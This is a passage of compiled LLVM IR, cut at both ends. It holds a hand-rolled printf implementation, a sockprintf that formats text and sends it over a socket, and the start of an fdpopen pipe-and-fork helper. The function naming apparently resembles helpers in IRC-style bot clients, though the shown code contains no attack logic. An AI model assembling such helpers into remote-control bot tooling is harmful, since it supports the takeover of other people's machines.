  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** noundef %125, i32 noundef %143, i32 noundef 10, i32 noundef 1, i32 noundef %144, i32 noundef %145, i32 noundef 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** noundef %155, i32 noundef %173, i32 noundef 16, i32 noundef 0, i32 noundef %174, i32 noundef %175, i32 noundef 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** noundef %185, i32 noundef %203, i32 noundef 16, i32 noundef 0, i32 noundef %204, i32 noundef %205, i32 noundef 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** noundef %215, i32 noundef %233, i32 noundef 10, i32 noundef 0, i32 noundef %234, i32 noundef %235, i32 noundef 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** noundef %266, i8* noundef %267, i32 noundef %268, i32 noundef %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** noundef %276, i32 noundef %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !13

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @prints(i8** noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !14

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %51, i32 noundef %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !15

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** noundef %65, i32 noundef %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !16

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %79, i32 noundef %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !17

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @printi(i8** noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** noundef %28, i8* noundef %29, i32 noundef %30, i32 noundef %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !18

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** noundef %85, i32 noundef 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** noundef %96, i8* noundef %97, i32 noundef %98, i32 noundef %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @printchar(i8** noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 noundef 1, i8* noundef %16, i64 noundef 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32 noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @szprintf(i8* noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** noundef %3, i8* noundef %8, %struct.__va_list_tag* noundef %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sockprintf(i32 noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 noundef 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** noundef %5, i8* noundef %14, %struct.__va_list_tag* noundef %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* noundef %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i64 0, i64 0), i8* noundef %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* noundef %27) #11
  %29 = call i64 @send(i32 noundef %25, i8* noundef %26, i64 noundef %28, i32 noundef 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* noundef %31) #12
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @free(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdpopen(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %123

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* noundef %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %123

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %123

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 noundef %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %123

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %99 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 noundef %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 noundef %61)
  store i32 -1, i32* %3, align 4
  br label %123

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 noundef %74, i32 noundef 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 noundef %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 noundef %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 noundef %89, i32 noundef 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 noundef %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 noundef %96)
  br label %98

98:                                               ; preds = %94, %79
  call void @_exit(i32 noundef 127) #14
  unreachable

99:                                               ; preds = %54
  %100 = load i8*, i8** %5, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 114
  br i1 %103, label %104, label %110

104:                                              ; preds = %99
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  store i32 %106, i32* %6, align 4
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %108 = load i32, i32* %107, align 4
  %109 = call i32 @close(i32 noundef %108)
  br label %116

110:                                              ; preds = %99
  %111 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %112 = load i32, i32* %111, align 4
  store i32 %112, i32* %6, align 4
